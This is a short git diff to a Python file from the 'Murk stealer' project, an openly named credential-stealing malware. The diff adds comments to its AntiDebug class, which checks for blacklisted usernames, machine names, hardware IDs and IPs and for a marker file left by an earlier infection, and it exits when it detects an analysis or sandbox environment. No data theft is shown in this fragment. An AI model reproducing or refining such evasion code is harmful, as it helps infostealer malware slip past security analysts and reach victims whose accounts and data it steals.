@@ -10,6 +10,10 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
+
+"""
+All imports
+"""
 import os
 import re
 import subprocess
@@ -18,13 +22,18 @@ import psutil
 import requests
 from typing import Literal
 
-
+"""
+class that checks if this computer is suitable
+"""
 class AntiDebug:
     def __init__(self) -> None:
-        if self.checks():
+        if self.checks(): # if  this computer is unsuitable prog will exit
             os._exit(os.EX_OK)
             print(10/0)
-
+    
+    """
+    checks PS User names, PC names, HWIDS, IPS or processes
+    """
     def checks(self) -> bool:
         debugging = False
 
@@ -76,7 +85,7 @@ class AntiDebug:
         username = os.getenv("UserName")
         hostname = os.getenv("COMPUTERNAME")
         pathf = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
-        if (os.path.exists(rf'{pathf}\system\sysFiles\winDef\log20742384.txt')):
+        if (os.path.exists(rf'{pathf}\system\sysFiles\winDef\log20742384.txt')):# Checks if a virus has opened on this PC
             return True
 
         for i in zip(self.blackListedHWIDS, self.blackListedUsers, self.blackListedPCNames):
